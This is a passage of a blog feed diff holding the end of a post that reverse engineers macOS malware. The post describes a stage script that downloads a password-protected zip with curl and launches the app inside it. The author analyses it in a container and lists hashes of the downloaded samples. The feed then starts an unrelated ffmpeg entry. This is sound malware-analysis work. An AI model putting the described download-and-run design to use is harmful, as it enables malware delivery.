+&lt;p&gt;You can see that it builds a request URL &lt;code class=&quot;highlighter-rouge&quot;&gt;url&lt;/code&gt;, it uses &lt;code class=&quot;highlighter-rouge&quot;&gt;curl&lt;/code&gt; to download something from that URL into a temporary folder, next it unzips the file with the password it has, it finds an app that is contained in it and eventually launches that app with some arguments.&lt;/p&gt;
+
+&lt;p&gt;I ended up simply hardcoding some values for &lt;code class=&quot;highlighter-rouge&quot;&gt;os_version&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;session_guid&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;machine_id&lt;/code&gt;, commenting out the lines after the unzip, and just running this stage again in the docker container.&lt;/p&gt;
+
+&lt;p&gt;So, I ended up just hardcoding some values into the script, and running it in a secure Linux container. Just to be safe.&lt;/p&gt;
+
+&lt;p&gt;Interestingly, every time I run the script, it downloads a different file.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;f47b360433f1f696c7d0edc0dcd274562d200baa36ff479b148eab5296684cbe  run1.zip
+149f43daef9c4ac9ee17ffa108b392aa86fb230e128c6612583d52f47ea91af7  run2.zip
+add0beb0535945ab85d3ffda97248975d8dff2ddb7560eefc19ee025f8f62b11  run3.zip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Are these all different malwares that it’s launching? Doesn’t seem like it. After unzipping them and comparing the unzipped files with diff, it’s clear that they all contain the same files.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ diff -r Installer.app Installer2.app
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;It’s most likely that the server generates these zip files on-demand and thus somewhere there are things with different different timestamps, which means they have a different hash sum despite containing the same files.&lt;/p&gt;
+
+&lt;p&gt;The timestamp on most of the files is June 10th, which is a bit more than a week ago at this point, so fairly recent.&lt;/p&gt;
+
+&lt;p&gt;Unlike the first &lt;code class=&quot;highlighter-rouge&quot;&gt;Installer.app&lt;/code&gt; that we had, this one is not a bash script. But what does this &lt;code class=&quot;highlighter-rouge&quot;&gt;Installer.app&lt;/code&gt; do? Check out the next post, where I will be reverse engineering the binary to find out what it does.&lt;/p&gt;</content><author><name></name></author><summary type="html">This is part one of a multi-part series where I reverse engineer some shitty macOS malware. All the code is available here.</summary></entry><entry><title type="html">Tweaking ffmpeg</title><link href="https://blog.xfbs.net/posts/tweaking-ffmpeg" rel="alternate" type="text/html" title="Tweaking ffmpeg" /><published>2018-09-23T00:00:00+02:00</published><updated>2018-09-23T00:00:00+02:00</updated><id>https://blog.xfbs.net/posts/tweaking-ffmpeg</id><content type="html" xml:base="https://blog.xfbs.net/posts/tweaking-ffmpeg">&lt;p&gt;Today I spent some time exploring &lt;abbr&gt;ffmpeg&lt;/abbr&gt;. Kind of unintentionally, actually. I actually just wanted to record some screencasts with QuickTime to see what it can do. I didn’t know how easy it was—just open up QuickTime, select New Screen Recording, and off you go. But there is one issue.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/ffmpeg-terminal.png&quot; alt=&quot;ffmpeg transcoding a video&quot; /&gt;&lt;/p&gt;
 
